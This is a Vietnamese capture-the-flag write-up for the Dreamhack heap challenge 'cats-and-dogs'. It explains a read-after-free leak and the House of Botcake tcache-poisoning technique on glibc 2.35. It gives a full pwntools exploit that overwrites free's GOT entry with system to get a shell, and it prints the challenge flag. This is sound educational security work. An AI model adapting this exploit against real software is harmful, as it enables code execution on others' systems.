---
title: "(Dreamhack) cats-and-dogs"
date: 2025-09-18 00:00:00 +0700
categories: [Heap exploit]
tags: [House of Botcake, House of, Heap exploitation, Dreamhack]
---
[Link challenge](https://dreamhack.io/wargame/challenges/1964)
# Kiểm tra file binary  
Kiểm tả protections của file:

![Kiểm tra protections](/assets/imagespost1/screenshot-2025-09-18-231036.png)


Tóm tắt source code, đây là 1 note challenge có hàm malloc, free, edit, với read data, ta sẽ kiểm tra từng hàm:

__Hàm malloc__

![malloc animal](/assets/imagespost1/malloc.png)

__Hàm free__

![free animal](/assets/imagespost1/free.png)

__Hàm print data__
 
![print animal](/assets/imagespost1/read.png)

__Hàm modify data__

![modify animal](/assets/imagespost1/modify.png)

Với animal dog thì cũng gần như giống cat chỉ khác nhau mỗi lần malloc dog thì malloc(0x100) và tối đa 2 chunk thay vì 16 chunk như cat.

# Exploit
Challenge sử dụng glibc 2.35, ban đầu mình thử double free tcache nhưng không được vì hàm modify kiểm tra con trỏ có NULL hay không trước khi modify, nhưng ở hàm print data nó lại không kiểm tra, tức là ta có bug read after free.

Challenge này mình sẽ sử dụng kĩ thuật [House of Botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c) để overlap 1 phần của 1 chunk thành tcachebin, sau đó ghi từ vị trị chunk bị overlap, đè fd của tcachebin đó thành địa chỉ mong muốn.

Đầu tiên, ta sẽ malloc 10 chunk cat, 7 chunk dùng để fill tcachebin, 1 chunk dùng để consolidate, 1 chunk là victim, 1 chunk để tránh chunk victim consolidate với top chunk.

```python
for i in range(10):
    malloc("cat", i)
#fill tcache 
for i in range(7):
    free("cat", i)
free("cat", 8) #free victim chunk into unsorted bin
show("cat", 0)
p.recvuntil(b'says: ')
heap_base = u64(b'\x00\x00'+p.recvn(3).ljust(6, b'\x00')) >> 4
xor_key = heap_base >> 12
print("Heap base: ", hex(heap_base))
print("Xor key: ", hex(xor_key))
show("cat",8)
p.recvuntil(b'says: ')
libc.address = u64(p.recvn(6).ljust(8, b'\x00')) - 0x21ace0
print("Libc base: ", hex(libc.address))
```

 Tiếp theo ta sẽ free chunk trước unsorted bin, khi đó chunk ta free sẽ consolidate với unsorted bin, free 1 chunk trong unsorted bin -> overlap

 ```python
free("cat", 7)      #free chunk 7 to consolidate
malloc("cat", 10)   #malloc 1 chunk from tcachebin
free("cat", 8)      #able to free 1 chunk into tcachebin, index 8 is now in unsorted bin -> overlapped
```

Khi tcachebin đã overlap, ta sẽ cần 1 bug overflow để ghi từ unsorted bin làm overflow fd của tcachebin, ta sẽ chọn malloc dog vì nó sẽ malloc size lớn hơn.

Khi đã overflow fd của tcachebin, ta đã có được aaw, khi đó có thể ghi vào got của free

```python
malloc("dog", 0)    
edit("dog", 0,b'a'*0x98 + p64(0xa1) + p64(((0x404018)-8)^xor_key))
malloc("cat", 11)
malloc("cat", 12)
edit("cat", 12, p64(libc.address+ogg[3])*2)
free("cat", 13)
```

# Full script

```python
from pwn import *
from subprocess import check_output
import sys
import os
_path = "./main_patched"
context.binary = exe = ELF(_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.35.so", checksec=False)
addr = 'host8.dreamhack.games'
port = 15031
cmd = f'''
    set solib-search-path {os.getcwd()}
#    brva 0x3678
    continue
'''
context.terminal = ['wt.exe', 'wsl', '-e', 'bash', '-c']
def sl(_data):
    p.sendline(_data)
def sla(rgx, _data):
    p.sendlineafter(rgx, _data)
def se(_data):
    p.send(_data)
def sa(rgx, _data):
    p.sendafter(rgx, _data)
def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))
if args.LOCAL:
        if args.GDB:
            p = gdb.debug(_path, cmd)
        else:
            p = exe.process()
if args.DOCKER:
        p = remote(addr, port)
        sleep(2)
        if args.GDB:
            pid = get_pid("")
            gdb.attach(pid, exe=exe.path,
                    gdbscript=cmd+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe")
            pause()
elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(addr, port)

def malloc(animal, idx):
    if(animal == "cat"):
        sla(b'choice: ', b'1')
        sla(b'cat: ', str(idx))
    elif(animal == "dog"):
        sla(b'choice: ', b'5')
        sla(b'dog: ', str(idx))
def free(animal, idx):
    if(animal == "cat"):
        sla(b'choice: ', b'4')
        sla(b'cat: ', str(idx))
    elif(animal == "dog"):
        sla(b'choice: ', b'8')
        sla(b'dog: ', str(idx))
def show(animal, idx):
    if(animal == "cat"):
        sla(b'choice: ', b'2')
        sla(b'cat: ', str(idx))
    elif(animal == "dog"):
        sla(b'choice: ', b'6')
        sla(b'dog: ', str(idx))
def edit(animal, idx, data):
    if(animal == "cat"):
        sla(b'choice: ', b'3')
        sla(b'cat: ', str(idx))
        sla(b'word: ', data)
    elif(animal == "dog"):
        sla(b'choice: ', b'7')
        sla(b'dog: ', str(idx))
        sa(b'word: ', data)
for i in range(10):
    malloc("cat", i)
#fill tcache 
for i in range(7):
    free("cat", i)
free("cat", 8)
show("cat", 0)
p.recvuntil(b'says: ')
heap_base = u64(b'\x00\x00'+p.recvn(3).ljust(6, b'\x00')) >> 4
xor_key = heap_base >> 12
print("Heap base: ", hex(heap_base))
print("Xor key: ", hex(xor_key))
show("cat",8)
p.recvuntil(b'says: ')
libc.address = u64(p.recvn(6).ljust(8, b'\x00')) - 0x21ace0
print("Libc base: ", hex(libc.address))

free("cat", 7)
malloc("cat", 10)
free("cat", 8)

malloc("dog", 0)
edit("dog", 0,b'/bin/sh\x00'*4 + b'a'*(0x98-0x20) + p64(0xa1) + p64((0x404010)^xor_key))
malloc("cat", 11)
malloc("cat", 12)
edit("cat", 12, p64(0)+p64(libc.sym.system))
edit("cat", 11, b'/bin/sh\x00')
free("cat", 11)
p.sendline(b'cat flag')
p.interactive()
# DH{They_both_like_cake:Knl1DBtdFjZAQjlJNVqc+A==}
```


